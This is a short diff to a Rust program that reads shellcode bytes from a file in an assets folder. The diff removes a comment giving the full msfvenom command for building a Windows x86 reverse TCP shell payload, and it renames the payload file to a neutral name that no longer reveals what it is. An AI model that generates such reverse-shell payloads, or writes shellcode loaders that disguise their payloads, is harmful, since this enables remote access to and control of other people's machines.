@@ -9,8 +9,7 @@ fn main() {
     let cwd = path.display();
 
     // Shellcode:
-    // msfvenom --payload 'windows/x86/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'windows' --arch 'x86' --out windows-x86-shell_reverse_tcp.bin
-    let shellcode_path = format!("{}/assets/windows-x86-shell_reverse_tcp.bin", cwd);
+    let shellcode_path = format!("{}/assets/windows-x86.bin", cwd);
 
     let shellcode_bytes = fs::read(shellcode_path).expect("Failed to open file");
 
